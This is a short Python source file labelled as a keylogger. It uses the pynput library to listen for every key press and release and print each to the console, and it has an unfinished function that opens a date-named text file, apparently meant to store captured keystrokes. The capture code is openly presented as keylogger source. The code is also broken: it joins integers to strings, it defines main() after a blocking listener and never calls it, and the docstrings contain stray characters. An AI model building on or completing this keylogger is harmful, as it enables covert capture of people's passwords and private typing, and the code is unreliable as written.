"""
Python Keylogger
By Connor Jackson
"""
from pynput import keyboard
import datetime

now = datetime.datetime.now()

"""l
Displays the keys ressed (used for debugging)
"""
def pressed(key):
    print("{} was pressed".format(key.char))

"""
Displays the keys released (also used for debugging)
"""
def released(key):
    print("{} was released".format(key))
    if key == keyboard.Key.esc:
        #Used to end the program
        print("Exiting")
        return False

"""
Main function used to collect inputs
"""
with keyboard.Listener(on_press = pressed, on_release= released) as logger:
    logger.join()

def main():
    date = now.day + "-" + now.month + "-" + now.year
    f = open(date + ".txt", "w")

